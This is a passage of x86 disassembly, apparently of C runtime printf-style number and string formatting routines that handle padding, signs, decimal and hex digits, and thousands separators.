  403d44:	mov    DWORD PTR [ebx+0x8],edx
  403d47:	jne    0x403d30
  403d49:	jmp    0x403c92
  403d4e:	xchg   ax,ax
  403d50:	push   ebp
  403d51:	push   edi
  403d52:	push   esi
  403d53:	push   ebx
  403d54:	mov    esi,eax
  403d56:	mov    ebx,ecx
  403d58:	sub    esp,0xc
  403d5b:	mov    ebp,DWORD PTR [ecx+0xc]
  403d5e:	cmp    ebp,edx
  403d60:	jge    0x403e11
  403d66:	test   ebp,ebp
  403d68:	js     0x403e11
  403d6e:	mov    eax,DWORD PTR [ebx+0x8]
  403d71:	cmp    ebp,eax
  403d73:	jge    0x403e1e
  403d79:	sub    eax,ebp
  403d7b:	test   eax,eax
  403d7d:	mov    DWORD PTR [ebx+0x8],eax
  403d80:	jle    0x403e44
  403d86:	test   BYTE PTR [ebx+0x5],0x4
  403d8a:	jne    0x403e35
  403d90:	sub    eax,0x1
  403d93:	mov    DWORD PTR [ebx+0x8],eax
  403d96:	lea    esi,[esi+0x0]
  403d99:	lea    edi,[edi+eiz*1+0x0]
  403da0:	mov    edx,ebx
  403da2:	mov    eax,0x20
  403da7:	call   0x403bd0
  403dac:	mov    eax,DWORD PTR [ebx+0x8]
  403daf:	lea    edx,[eax-0x1]
  403db2:	test   eax,eax
  403db4:	mov    DWORD PTR [ebx+0x8],edx
  403db7:	jne    0x403da0
  403db9:	test   ebp,ebp
  403dbb:	lea    edi,[ebp-0x1]
  403dbe:	je     0x403dfc
  403dc0:	mov    ebp,esi
  403dc2:	add    ebp,0x1
  403dc5:	movsx  eax,BYTE PTR [ebp-0x1]
  403dc9:	mov    edx,ebx
  403dcb:	call   0x403bd0
  403dd0:	mov    eax,0x1
  403dd5:	sub    eax,ebp
  403dd7:	add    eax,edi
  403dd9:	add    eax,esi
  403ddb:	jne    0x403dc2
  403ddd:	mov    eax,DWORD PTR [ebx+0x8]
  403de0:	lea    edx,[eax-0x1]
  403de3:	test   eax,eax
  403de5:	mov    DWORD PTR [ebx+0x8],edx
  403de8:	jle    0x403e09
  403dea:	lea    esi,[esi+0x0]
  403df0:	mov    edx,ebx
  403df2:	mov    eax,0x20
  403df7:	call   0x403bd0
  403dfc:	mov    eax,DWORD PTR [ebx+0x8]
  403dff:	lea    edx,[eax-0x1]
  403e02:	test   eax,eax
  403e04:	mov    DWORD PTR [ebx+0x8],edx
  403e07:	jg     0x403df0
  403e09:	add    esp,0xc
  403e0c:	pop    ebx
  403e0d:	pop    esi
  403e0e:	pop    edi
  403e0f:	pop    ebp
  403e10:	ret    
  403e11:	mov    eax,DWORD PTR [ebx+0x8]
  403e14:	mov    ebp,edx
  403e16:	cmp    ebp,eax
  403e18:	jl     0x403d79
  403e1e:	test   ebp,ebp
  403e20:	mov    DWORD PTR [ebx+0x8],0xffffffff
  403e27:	lea    edi,[ebp-0x1]
  403e2a:	jne    0x403dc0
  403e2c:	mov    DWORD PTR [ebx+0x8],0xfffffffe
  403e33:	jmp    0x403e09
  403e35:	test   ebp,ebp
  403e37:	lea    edi,[ebp-0x1]
  403e3a:	jne    0x403dc0
  403e3c:	sub    eax,0x1
  403e3f:	mov    DWORD PTR [ebx+0x8],eax
  403e42:	jmp    0x403df0
  403e44:	test   ebp,ebp
  403e46:	lea    edi,[ebp-0x1]
  403e49:	jne    0x403dc0
  403e4f:	sub    eax,0x1
  403e52:	mov    DWORD PTR [ebx+0x8],eax
  403e55:	jmp    0x403e09
  403e57:	mov    esi,esi
  403e59:	lea    edi,[edi+eiz*1+0x0]
  403e60:	push   ebp
  403e61:	push   edi
  403e62:	push   esi
  403e63:	push   ebx
  403e64:	sub    esp,0x1c
  403e67:	test   eax,eax
  403e69:	mov    DWORD PTR [ecx+0xc],0xffffffff
  403e70:	je     0x403eb0
  403e72:	mov    ebp,DWORD PTR [ecx+0x4]
  403e75:	lea    edi,[esp+0xd]
  403e79:	lea    eax,[esp+0xc]
  403e7d:	mov    BYTE PTR [esp+0xc],0x2d
  403e82:	and    ebp,0x20
  403e85:	xor    esi,esi
  403e87:	movzx  ebx,BYTE PTR [edx+esi*1]
  403e8b:	and    ebx,0xffffffdf
  403e8e:	or     ebx,ebp
  403e90:	mov    BYTE PTR [edi+esi*1],bl
  403e93:	add    esi,0x1
  403e96:	cmp    esi,0x3
  403e99:	jne    0x403e87
  403e9b:	lea    edx,[edi+0x3]
  403e9e:	sub    edx,eax
  403ea0:	call   0x403d50
  403ea5:	add    esp,0x1c
  403ea8:	pop    ebx
  403ea9:	pop    esi
  403eaa:	pop    edi
  403eab:	pop    ebp
  403eac:	ret    
  403ead:	lea    esi,[esi+0x0]
  403eb0:	mov    ebp,DWORD PTR [ecx+0x4]
  403eb3:	test   ebp,0x100
  403eb9:	je     0x403ed0
  403ebb:	mov    BYTE PTR [esp+0xc],0x2b
  403ec0:	lea    edi,[esp+0xd]
  403ec4:	lea    eax,[esp+0xc]
  403ec8:	jmp    0x403e82
  403eca:	lea    esi,[esi+0x0]
  403ed0:	test   ebp,0x40
  403ed6:	je     0x403ef0
  403ed8:	mov    BYTE PTR [esp+0xc],0x20
  403edd:	lea    edi,[esp+0xd]
  403ee1:	lea    eax,[esp+0xc]
  403ee5:	jmp    0x403e82
  403ee7:	mov    esi,esi
  403ee9:	lea    edi,[edi+eiz*1+0x0]
  403ef0:	lea    eax,[esp+0xc]
  403ef4:	mov    edi,eax
  403ef6:	jmp    0x403e82
  403ef8:	nop
  403ef9:	lea    esi,[esi+eiz*1+0x0]
  403f00:	push   ebp
  403f01:	mov    ebp,esp
  403f03:	push   edi
  403f04:	push   esi
  403f05:	push   ebx
  403f06:	mov    ebx,eax
  403f08:	mov    edi,ecx
  403f0a:	mov    esi,edx
  403f0c:	sub    esp,0x3c
  403f0f:	mov    DWORD PTR [ebp-0x20],eax
  403f12:	mov    eax,DWORD PTR [ecx+0xc]
  403f15:	mov    ecx,0x0
  403f1a:	mov    DWORD PTR [ebp-0x1c],edx
  403f1d:	test   eax,eax
  403f1f:	mov    DWORD PTR [ebp-0x34],eax
  403f22:	cmovns ecx,eax
  403f25:	mov    eax,DWORD PTR [edi+0x4]
  403f28:	add    ecx,0x17
  403f2b:	test   ah,0x10
  403f2e:	mov    DWORD PTR [ebp-0x2c],eax
  403f31:	je     0x403f3e
  403f33:	cmp    WORD PTR [edi+0x1c],0x0
  403f38:	jne    0x404152
  403f3e:	mov    edx,DWORD PTR [edi+0x8]
  403f41:	mov    eax,ecx
  403f43:	cmp    ecx,edx
  403f45:	mov    DWORD PTR [ebp-0x38],edx
  403f48:	cmovl  eax,edx
  403f4b:	add    eax,0xf
  403f4e:	and    eax,0xfffffff0
  403f51:	call   0x4039a0
  403f56:	sub    esp,eax
  403f58:	test   BYTE PTR [ebp-0x2c],0x80
  403f5c:	lea    eax,[esp+0x10]
  403f60:	mov    DWORD PTR [ebp-0x24],eax
  403f63:	je     0x403f7d
  403f65:	mov    eax,DWORD PTR [ebp-0x1c]
  403f68:	test   eax,eax
  403f6a:	js     0x4041e0
  403f70:	and    DWORD PTR [ebp-0x2c],0xffffff7f
  403f77:	mov    eax,DWORD PTR [ebp-0x2c]
  403f7a:	mov    DWORD PTR [edi+0x4],eax
  403f7d:	mov    eax,esi
  403f7f:	or     eax,ebx
  403f81:	je     0x4041f2
  403f87:	mov    eax,DWORD PTR [ebp-0x24]
  403f8a:	mov    DWORD PTR [ebp-0x30],edi
  403f8d:	mov    ecx,eax
  403f8f:	mov    eax,DWORD PTR [ebp-0x2c]
  403f92:	mov    edi,ecx
  403f94:	and    eax,0x1000
  403f99:	mov    DWORD PTR [ebp-0x28],eax
  403f9c:	lea    esi,[esi+eiz*1+0x0]
  403fa0:	lea    ecx,[edi+0x1]
  403fa3:	mov    DWORD PTR [esp],ebx
  403fa6:	mov    DWORD PTR [esp+0x4],esi
  403faa:	mov    DWORD PTR [esp+0x8],0xa
  403fb2:	mov    DWORD PTR [esp+0xc],0x0
  403fba:	mov    DWORD PTR [ebp-0x20],ecx
  403fbd:	call   0x40b0a0
  403fc2:	add    eax,0x30
  403fc5:	mov    BYTE PTR [edi],al
  403fc7:	mov    DWORD PTR [esp],ebx
  403fca:	mov    DWORD PTR [esp+0x4],esi
  403fce:	mov    DWORD PTR [esp+0x8],0xa
  403fd6:	mov    DWORD PTR [esp+0xc],0x0
  403fde:	call   0x40af90
  403fe3:	mov    ebx,eax
  403fe5:	mov    eax,edx
  403fe7:	mov    esi,edx
  403fe9:	or     eax,ebx
  403feb:	mov    ecx,DWORD PTR [ebp-0x20]
  403fee:	je     0x404040
  403ff0:	cmp    DWORD PTR [ebp-0x24],ecx
  403ff3:	je     0x404020
  403ff5:	mov    eax,DWORD PTR [ebp-0x28]
  403ff8:	test   eax,eax
  403ffa:	je     0x404020
  403ffc:	mov    eax,DWORD PTR [ebp-0x30]
  403fff:	cmp    WORD PTR [eax+0x1c],0x0
  404004:	je     0x404020
  404006:	mov    eax,ecx
  404008:	sub    eax,DWORD PTR [ebp-0x24]
  40400b:	cdq    
  40400c:	shr    edx,0x1e
  40400f:	add    eax,edx
  404011:	and    eax,0x3
  404014:	sub    eax,edx
  404016:	cmp    eax,0x3
  404019:	je     0x404030
  40401b:	nop
  40401c:	lea    esi,[esi+eiz*1+0x0]
  404020:	mov    edi,ecx
  404022:	jmp    0x403fa0
  404027:	mov    esi,esi
  404029:	lea    edi,[edi+eiz*1+0x0]
  404030:	lea    ecx,[edi+0x2]
  404033:	mov    BYTE PTR [edi+0x1],0x2c
  404037:	mov    edi,ecx
  404039:	jmp    0x403fa0
  40403e:	xchg   ax,ax
  404040:	mov    edi,DWORD PTR [ebp-0x30]
  404043:	mov    esi,DWORD PTR [ebp-0x34]
  404046:	mov    ebx,ecx
  404048:	test   esi,esi
  40404a:	jle    0x40406b
  40404c:	mov    eax,DWORD PTR [ebp-0x24]
  40404f:	mov    ebx,ecx
  404051:	sub    eax,ecx
  404053:	add    eax,esi
  404055:	test   eax,eax
  404057:	jle    0x40406b
  404059:	lea    ebx,[ecx+eax*1]
  40405c:	lea    esi,[esi+eiz*1+0x0]
  404060:	add    ecx,0x1
  404063:	mov    BYTE PTR [ecx-0x1],0x30
  404067:	cmp    ecx,ebx
  404069:	jne    0x404060
  40406b:	cmp    ebx,DWORD PTR [ebp-0x24]
  40406e:	jne    0x404080
  404070:	mov    edx,DWORD PTR [ebp-0x34]
  404073:	test   edx,edx
  404075:	je     0x404080
  404077:	mov    BYTE PTR [ebx],0x30
  40407a:	add    ebx,0x1
  40407d:	lea    esi,[esi+0x0]
  404080:	mov    esi,DWORD PTR [ebp-0x38]
  404083:	test   esi,esi
  404085:	jle    0x4040e4
  404087:	mov    eax,DWORD PTR [ebp-0x24]
  40408a:	sub    eax,ebx
  40408c:	add    eax,esi
  40408e:	test   eax,eax
  404090:	mov    DWORD PTR [edi+0x8],eax
  404093:	jle    0x4040e4
  404095:	test   DWORD PTR [ebp-0x2c],0x1c0
  40409c:	je     0x4040a4
  40409e:	sub    eax,0x1
  4040a1:	mov    DWORD PTR [edi+0x8],eax
  4040a4:	mov    eax,DWORD PTR [ebp-0x34]
  4040a7:	test   eax,eax
  4040a9:	js     0x404190
  4040af:	test   DWORD PTR [ebp-0x2c],0x400
  4040b6:	jne    0x4040e4
  4040b8:	mov    eax,DWORD PTR [edi+0x8]
  4040bb:	lea    edx,[eax-0x1]
  4040be:	test   eax,eax
  4040c0:	mov    DWORD PTR [edi+0x8],edx
  4040c3:	jle    0x4040e4
  4040c5:	mov    edx,edi
  4040c7:	mov    eax,0x20
  4040cc:	call   0x403bd0
  4040d1:	mov    eax,DWORD PTR [edi+0x8]
  4040d4:	lea    edx,[eax-0x1]
  4040d7:	test   eax,eax
  4040d9:	mov    DWORD PTR [edi+0x8],edx
  4040dc:	jg     0x4040c5
  4040de:	mov    eax,DWORD PTR [edi+0x4]
  4040e1:	mov    DWORD PTR [ebp-0x2c],eax
  4040e4:	test   BYTE PTR [ebp-0x2c],0x80
  4040e8:	je     0x404141
  4040ea:	lea    esi,[ebx+0x1]
  4040ed:	mov    BYTE PTR [ebx],0x2d
  4040f0:	cmp    DWORD PTR [ebp-0x24],esi
  4040f3:	mov    ebx,DWORD PTR [ebp-0x24]
  4040f6:	jae    0x40412c
  4040f8:	nop
  4040f9:	lea    esi,[esi+eiz*1+0x0]
  404100:	sub    esi,0x1
  404103:	movsx  eax,BYTE PTR [esi]
  404106:	mov    edx,edi
  404108:	call   0x403bd0
  40410d:	cmp    esi,ebx
  40410f:	jne    0x404100
  404111:	mov    eax,DWORD PTR [edi+0x8]
  404114:	lea    edx,[eax-0x1]
  404117:	test   eax,eax
  404119:	mov    DWORD PTR [edi+0x8],edx
  40411c:	jle    0x404139
  40411e:	xchg   ax,ax
  404120:	mov    edx,edi
  404122:	mov    eax,0x20
  404127:	call   0x403bd0
  40412c:	mov    eax,DWORD PTR [edi+0x8]
  40412f:	lea    edx,[eax-0x1]
  404132:	test   eax,eax
  404134:	mov    DWORD PTR [edi+0x8],edx
  404137:	jg     0x404120
  404139:	lea    esp,[ebp-0xc]
  40413c:	pop    ebx
  40413d:	pop    esi
  40413e:	pop    edi
  40413f:	pop    ebp
  404140:	ret    
  404141:	test   DWORD PTR [ebp-0x2c],0x100
  404148:	je     0x404170
  40414a:	lea    esi,[ebx+0x1]
  40414d:	mov    BYTE PTR [ebx],0x2b
  404150:	jmp    0x4040f0
  404152:	mov    eax,ecx
  404154:	mov    edx,0x55555556
  404159:	imul   edx
  40415b:	mov    eax,ecx
  40415d:	sar    eax,0x1f
  404160:	sub    edx,eax
  404162:	add    ecx,edx
  404164:	jmp    0x403f3e
  404169:	lea    esi,[esi+eiz*1+0x0]
  404170:	test   BYTE PTR [ebp-0x2c],0x40
  404174:	mov    esi,ebx
  404176:	je     0x4040f0
  40417c:	add    esi,0x1
  40417f:	mov    BYTE PTR [ebx],0x20
  404182:	jmp    0x4040f0
  404187:	mov    esi,esi
  404189:	lea    edi,[edi+eiz*1+0x0]
  404190:	mov    eax,DWORD PTR [ebp-0x2c]
  404193:	and    eax,0x600
  404198:	cmp    eax,0x200
  40419d:	jne    0x4040af
  4041a3:	mov    eax,DWORD PTR [edi+0x8]
  4041a6:	lea    edx,[eax-0x1]
  4041a9:	test   eax,eax
  4041ab:	mov    DWORD PTR [edi+0x8],edx
  4041ae:	jle    0x4040e4
  4041b4:	add    eax,ebx
  4041b6:	lea    esi,[esi+0x0]
  4041b9:	lea    edi,[edi+eiz*1+0x0]
  4041c0:	add    ebx,0x1
  4041c3:	mov    BYTE PTR [ebx-0x1],0x30
  4041c7:	cmp    ebx,eax
  4041c9:	jne    0x4041c0
  4041cb:	mov    DWORD PTR [edi+0x8],0xffffffff
  4041d2:	jmp    0x4040e4
  4041d7:	mov    esi,esi
  4041d9:	lea    edi,[edi+eiz*1+0x0]
  4041e0:	mov    ebx,DWORD PTR [ebp-0x20]
  4041e3:	mov    esi,DWORD PTR [ebp-0x1c]
  4041e6:	neg    ebx
  4041e8:	adc    esi,0x0
  4041eb:	neg    esi
  4041ed:	jmp    0x403f7d
  4041f2:	mov    ecx,DWORD PTR [ebp-0x24]
  4041f5:	jmp    0x404043
  4041fa:	lea    esi,[esi+0x0]
  404200:	push   ebp
  404201:	mov    ebp,esp
  404203:	push   edi
  404204:	push   esi
  404205:	push   ebx
  404206:	mov    edi,ecx
  404208:	mov    esi,edx
  40420a:	sub    esp,0x2c
  40420d:	cmp    eax,0x6f
  404210:	mov    DWORD PTR [ebp-0x28],eax
  404213:	mov    DWORD PTR [ebp-0x34],ecx
  404216:	mov    eax,0x18
  40421b:	mov    ecx,0x12
  404220:	cmovne eax,ecx
  404223:	mov    DWORD PTR [ebp-0x24],edx
  404226:	mov    cl,0x0
  404228:	mov    edx,eax
  40422a:	setne  al
  40422d:	movzx  ebx,al
  404230:	movzx  eax,al
  404233:	add    eax,0x3
  404236:	lea    ebx,[ebx*8+0x7]
  40423d:	mov    DWORD PTR [ebp-0x1c],eax
  404240:	mov    eax,DWORD PTR [ebp+0x8]
  404243:	mov    eax,DWORD PTR [eax+0xc]
  404246:	test   eax,eax
  404248:	mov    DWORD PTR [ebp-0x2c],eax
  40424b:	cmovns ecx,eax
  40424e:	mov    eax,DWORD PTR [ebp+0x8]
  404251:	lea    ecx,[edx+ecx*1]
  404254:	mov    eax,DWORD PTR [eax+0x4]
  404257:	test   ah,0x10
  40425a:	mov    DWORD PTR [ebp-0x38],eax
  40425d:	je     0x40426d
  40425f:	mov    eax,DWORD PTR [ebp+0x8]
  404262:	cmp    WORD PTR [eax+0x1c],0x0
  404267:	jne    0x4044a0
  40426d:	mov    eax,DWORD PTR [ebp+0x8]
  404270:	mov    eax,DWORD PTR [eax+0x8]
  404273:	cmp    ecx,eax
  404275:	mov    edx,eax
  404277:	mov    DWORD PTR [ebp-0x30],eax
  40427a:	mov    eax,ecx
  40427c:	cmovl  eax,edx
  40427f:	add    eax,0xf
  404282:	and    eax,0xfffffff0
  404285:	call   0x4039a0
  40428a:	sub    esp,eax
  40428c:	mov    eax,DWORD PTR [ebp-0x34]
  40428f:	or     eax,DWORD PTR [ebp-0x24]
  404292:	mov    DWORD PTR [ebp-0x20],esp
  404295:	mov    eax,esp
  404297:	je     0x404590
  40429d:	movzx  ecx,BYTE PTR [ebp-0x28]
  4042a1:	and    ecx,0x20
  4042a4:	mov    BYTE PTR [ebp-0x24],cl
  4042a7:	jmp    0x4042cd
  4042a9:	lea    esi,[esi+eiz*1+0x0]
  4042b0:	mov    BYTE PTR [eax-0x1],cl
  4042b3:	movzx  ecx,BYTE PTR [ebp-0x1c]
  4042b7:	xor    edx,edx
  4042b9:	shrd   esi,edi,cl
  4042bc:	shr    edi,cl
  4042be:	test   cl,0x20
  4042c1:	cmovne esi,edi
  4042c4:	cmovne edi,edx
  4042c7:	mov    ecx,edi
  4042c9:	or     ecx,esi
  4042cb:	je     0x4042f0
  4042cd:	mov    edx,esi
  4042cf:	add    eax,0x1
  4042d2:	and    edx,ebx
  4042d4:	lea    ecx,[edx+0x30]
  4042d7:	cmp    cl,0x39
  4042da:	jbe    0x4042b0
  4042dc:	add    edx,0x37
  4042df:	or     dl,BYTE PTR [ebp-0x24]
  4042e2:	mov    BYTE PTR [eax-0x1],dl
  4042e5:	jmp    0x4042b3
  4042e7:	mov    esi,esi
  4042e9:	lea    edi,[edi+eiz*1+0x0]
  4042f0:	cmp    DWORD PTR [ebp-0x20],eax
  4042f3:	je     0x404590
  4042f9:	mov    edi,DWORD PTR [ebp-0x2c]
  4042fc:	test   edi,edi
  4042fe:	jle    0x4044f4
  404304:	mov    edx,DWORD PTR [ebp-0x20]
  404307:	sub    edx,eax
  404309:	add    edx,edi
  40430b:	test   edx,edx
  40430d:	jle    0x4044f4
  404313:	add    edx,eax
  404315:	add    eax,0x1
  404318:	mov    BYTE PTR [eax-0x1],0x30
  40431c:	cmp    eax,edx
  40431e:	jne    0x404315
  404320:	cmp    edx,DWORD PTR [ebp-0x20]
  404323:	jne    0x404332
  404325:	mov    edi,DWORD PTR [ebp-0x2c]
  404328:	test   edi,edi
  40432a:	je     0x404332
  40432c:	mov    BYTE PTR [edx],0x30
  40432f:	add    edx,0x1
  404332:	mov    eax,edx
  404334:	sub    eax,DWORD PTR [ebp-0x20]
  404337:	cmp    eax,DWORD PTR [ebp-0x30]
  40433a:	jge    0x4043f0
  404340:	mov    edi,DWORD PTR [ebp-0x30]
  404343:	sub    edi,eax
  404345:	mov    eax,DWORD PTR [ebp+0x8]
  404348:	test   edi,edi
  40434a:	mov    DWORD PTR [eax+0x8],edi
  40434d:	jle    0x4043ff
  404353:	cmp    DWORD PTR [ebp-0x28],0x6f
  404357:	mov    eax,DWORD PTR [ebp+0x8]
  40435a:	mov    eax,DWORD PTR [eax+0x4]
  40435d:	je     0x404534
  404363:	test   ah,0x8
  404366:	je     0x404430
  40436c:	sub    edi,0x2
  40436f:	test   edi,edi
  404371:	jle    0x40437e
  404373:	mov    ebx,DWORD PTR [ebp-0x2c]
  404376:	test   ebx,ebx
  404378:	js     0x4044b7
  40437e:	movzx  eax,BYTE PTR [ebp-0x28]
  404382:	test   edi,edi
  404384:	lea    ebx,[edx+0x2]
  404387:	mov    BYTE PTR [edx+0x1],0x30
  40438b:	mov    BYTE PTR [edx],al
  40438d:	jg     0x404446
  404393:	cmp    ebx,DWORD PTR [ebp-0x20]
  404396:	jbe    0x4043e4
  404398:	nop
  404399:	lea    esi,[esi+eiz*1+0x0]
  4043a0:	mov    DWORD PTR [ebp-0x1c],edi
  4043a3:	mov    esi,DWORD PTR [ebp-0x20]
  4043a6:	mov    edi,ebx
  4043a8:	mov    ebx,DWORD PTR [ebp+0x8]
  4043ab:	nop
  4043ac:	lea    esi,[esi+eiz*1+0x0]
  4043b0:	sub    edi,0x1
  4043b3:	movsx  eax,BYTE PTR [edi]
  4043b6:	mov    edx,ebx
  4043b8:	call   0x403bd0
  4043bd:	cmp    esi,edi
  4043bf:	jb     0x4043b0
  4043c1:	mov    edi,DWORD PTR [ebp-0x1c]
  4043c4:	test   edi,edi
  4043c6:	lea    ebx,[edi-0x1]
  4043c9:	jle    0x4043e4
  4043cb:	mov    esi,DWORD PTR [ebp+0x8]
  4043ce:	xchg   ax,ax
  4043d0:	mov    edx,esi
  4043d2:	mov    eax,0x20
  4043d7:	sub    ebx,0x1
  4043da:	call   0x403bd0
  4043df:	cmp    ebx,0xffffffff
  4043e2:	jne    0x4043d0
  4043e4:	lea    esp,[ebp-0xc]
  4043e7:	pop    ebx
  4043e8:	pop    esi
  4043e9:	pop    edi
  4043ea:	pop    ebp
  4043eb:	ret    
  4043ec:	lea    esi,[esi+eiz*1+0x0]
  4043f0:	mov    eax,DWORD PTR [ebp+0x8]
  4043f3:	mov    edi,0xffffffff
  4043f8:	mov    DWORD PTR [eax+0x8],0xffffffff
  4043ff:	cmp    DWORD PTR [ebp-0x28],0x6f
  404403:	je     0x404550
  404409:	mov    eax,DWORD PTR [ebp+0x8]
  40440c:	mov    eax,DWORD PTR [eax+0x4]
  40440f:	mov    DWORD PTR [ebp-0x1c],eax
  404412:	and    eax,0x800
  404417:	test   eax,eax
  404419:	mov    ebx,edx
  40441b:	je     0x404393
  404421:	jmp    0x40437e
  404426:	lea    esi,[esi+0x0]
  404429:	lea    edi,[edi+eiz*1+0x0]
  404430:	mov    ecx,DWORD PTR [ebp-0x2c]
  404433:	test   ecx,ecx
  404435:	js     0x404560
  40443b:	test   ah,0x8
  40443e:	mov    ebx,edx
  404440:	jne    0x40437e
  404446:	mov    eax,DWORD PTR [ebp+0x8]
  404449:	test   BYTE PTR [eax+0x5],0x4
  40444d:	jne    0x404520
  404453:	lea    esi,[edi-0x1]
  404456:	mov    edi,DWORD PTR [ebp+0x8]
  404459:	mov    DWORD PTR [ebp-0x1c],ebx
  40445c:	mov    ebx,esi
  40445e:	xchg   ax,ax
  404460:	mov    eax,0x20
  404465:	sub    ebx,0x1
  404468:	mov    edx,edi
  40446a:	call   0x403bd0
  40446f:	lea    eax,[ebx+0x1]
  404472:	test   eax,eax
  404474:	jg     0x404460
  404476:	lea    edx,[esi-0x1]
  404479:	test   esi,esi
  40447b:	mov    eax,0x0
  404480:	mov    ebx,DWORD PTR [ebp-0x1c]
  404483:	cmovns eax,esi
  404486:	mov    edi,edx
  404488:	sub    edi,eax
  40448a:	cmp    DWORD PTR [ebp-0x20],ebx
  40448d:	jb     0x4043a0
  404493:	jmp    0x4043c4
  404498:	nop
  404499:	lea    esi,[esi+eiz*1+0x0]
  4044a0:	mov    eax,ecx
  4044a2:	mov    edx,0x55555556
  4044a7:	imul   edx
  4044a9:	mov    eax,ecx
  4044ab:	sar    eax,0x1f
  4044ae:	sub    edx,eax
  4044b0:	add    ecx,edx
  4044b2:	jmp    0x40426d
  4044b7:	mov    ecx,eax
  4044b9:	and    ecx,0x600
  4044bf:	cmp    ecx,0x200
  4044c5:	jne    0x40443b
  4044cb:	lea    ebx,[edx+edi*1]
  4044ce:	xchg   ax,ax
  4044d0:	add    edx,0x1
  4044d3:	mov    BYTE PTR [edx-0x1],0x30
  4044d7:	cmp    edx,ebx
  4044d9:	jne    0x4044d0
  4044db:	cmp    DWORD PTR [ebp-0x28],0x6f
  4044df:	je     0x4045a1
  4044e5:	and    eax,0x800
  4044ea:	mov    edi,0xffffffff
  4044ef:	jmp    0x404417
  4044f4:	cmp    DWORD PTR [ebp-0x28],0x6f
  4044f8:	mov    edx,eax
  4044fa:	jne    0x404320
  404500:	mov    edi,DWORD PTR [ebp+0x8]
  404503:	test   BYTE PTR [edi+0x5],0x8
  404507:	je     0x404320
  40450d:	add    edx,0x1
  404510:	mov    BYTE PTR [eax],0x30
  404513:	jmp    0x404320
  404518:	nop
  404519:	lea    esi,[esi+eiz*1+0x0]
  404520:	cmp    ebx,DWORD PTR [ebp-0x20]
  404523:	ja     0x4043a0
  404529:	lea    ebx,[edi-0x1]
  40452c:	mov    esi,DWORD PTR [ebp+0x8]
  40452f:	jmp    0x4043d0
  404534:	mov    esi,DWORD PTR [ebp-0x2c]
  404537:	test   esi,esi
  404539:	js     0x404560
  40453b:	test   ah,0x4
  40453e:	mov    ebx,edx
  404540:	jne    0x40448a
  404546:	lea    esi,[edi-0x1]
  404549:	mov    ebx,edx
  40454b:	jmp    0x404456
  404550:	cmp    DWORD PTR [ebp-0x20],edx
  404553:	mov    ebx,edx
  404555:	jb     0x4043a0
  40455b:	jmp    0x4043e4
  404560:	mov    ecx,eax
  404562:	and    ecx,0x600
  404568:	cmp    ecx,0x200
  40456e:	je     0x4044cb
  404574:	cmp    DWORD PTR [ebp-0x28],0x6f
  404578:	jne    0x40443b
  40457e:	test   ah,0x4
  404581:	mov    ebx,edx
  404583:	jne    0x40448a
  404589:	jmp    0x404546
  40458b:	nop
  40458c:	lea    esi,[esi+eiz*1+0x0]
  404590:	mov    edx,DWORD PTR [ebp-0x38]
  404593:	mov    edi,DWORD PTR [ebp+0x8]
  404596:	and    dh,0xf7
  404599:	mov    DWORD PTR [edi+0x4],edx
  40459c:	jmp    0x4042f9
  4045a1:	mov    edi,0xffffffff
  4045a6:	jmp    0x404393
  4045ab:	nop
  4045ac:	lea    esi,[esi+eiz*1+0x0]
  4045b0:	push   ebp
  4045b1:	mov    ebp,esp
  4045b3:	push   edi
  4045b4:	push   esi
  4045b5:	push   ebx
  4045b6:	mov    ebx,eax
  4045b8:	sub    esp,0x3c
  4045bb:	cmp    DWORD PTR [eax+0x10],0xfffffffd
  4045bf:	je     0x404652
  4045c5:	movzx  edx,WORD PTR [eax+0x14]
  4045c9:	test   dx,dx
  4045cc:	je     0x404630
  4045ce:	mov    eax,DWORD PTR [ebx+0x10]
  4045d1:	mov    DWORD PTR [ebp-0x2c],esp
  4045d4:	add    eax,0xf
  4045d7:	and    eax,0xfffffff0
  4045da:	call   0x4039a0
  4045df:	sub    esp,eax
  4045e1:	lea    eax,[ebp-0x1c]
  4045e4:	mov    DWORD PTR [ebp-0x1c],0x0
  4045eb:	lea    edi,[esp+0x10]
  4045ef:	mov    DWORD PTR [esp+0x4],edx
  4045f3:	mov    DWORD PTR [esp+0x8],eax
  4045f7:	mov    DWORD PTR [esp],edi
  4045fa:	call   0x40ab00
  4045ff:	test   eax,eax
  404601:	jle    0x404644
  404603:	lea    esi,[edi+eax*1]
  404606:	lea    esi,[esi+0x0]
  404609:	lea    edi,[edi+eiz*1+0x0]
  404610:	add    edi,0x1
  404613:	movsx  eax,BYTE PTR [edi-0x1]
  404617:	mov    edx,ebx
  404619:	call   0x403bd0
  40461e:	cmp    edi,esi
  404620:	jne    0x404610
  404622:	mov    esp,DWORD PTR [ebp-0x2c]
  404625:	lea    esp,[ebp-0xc]
  404628:	pop    ebx
  404629:	pop    esi
  40462a:	pop    edi
  40462b:	pop    ebp
  40462c:	ret    
  40462d:	lea    esi,[esi+0x0]
  404630:	mov    edx,ebx
  404632:	mov    eax,0x2e
  404637:	call   0x403bd0
  40463c:	lea    esp,[ebp-0xc]
  40463f:	pop    ebx
  404640:	pop    esi
  404641:	pop    edi
  404642:	pop    ebp
  404643:	ret    
  404644:	mov    edx,ebx
  404646:	mov    eax,0x2e
  40464b:	call   0x403bd0
  404650:	jmp    0x404622
  404652:	mov    DWORD PTR [ebp-0x1c],0x0
  404659:	call   0x40acf8
  40465e:	lea    edx,[ebp-0x1c]
  404661:	mov    DWORD PTR [esp+0x8],0x10
  404669:	mov    DWORD PTR [esp+0xc],edx
  40466d:	mov    eax,DWORD PTR [eax]
  40466f:	mov    DWORD PTR [esp+0x4],eax
  404673:	lea    eax,[ebp-0x1e]
  404676:	mov    DWORD PTR [esp],eax
  404679:	call   0x40a850
  40467e:	test   eax,eax
  404680:	jle    0x404692
  404682:	movzx  edx,WORD PTR [ebp-0x1e]
  404686:	mov    WORD PTR [ebx+0x14],dx
  40468a:	mov    DWORD PTR [ebx+0x10],eax
  40468d:	jmp    0x4045c9
  404692:	movzx  edx,WORD PTR [ebx+0x14]
  404696:	jmp    0x40468a
  404698:	nop
  404699:	lea    esi,[esi+eiz*1+0x0]
  4046a0:	push   ebp
  4046a1:	push   edi
  4046a2:	mov    ebp,eax
  4046a4:	push   esi
  4046a5:	push   ebx
  4046a6:	mov    esi,ecx
  4046a8:	mov    edi,edx
  4046aa:	sub    esp,0x1c
  4046ad:	test   esi,esi
  4046af:	mov    ebx,DWORD PTR [esp+0x30]
  4046b3:	mov    ecx,DWORD PTR [ebx+0x8]
  4046b6:	jle    0x404881
  4046bc:	cmp    esi,ecx
  4046be:	jge    0x4047f0
  4046c4:	sub    ecx,esi
  4046c6:	mov    DWORD PTR [ebx+0x8],ecx
  4046c9:	test   ecx,ecx
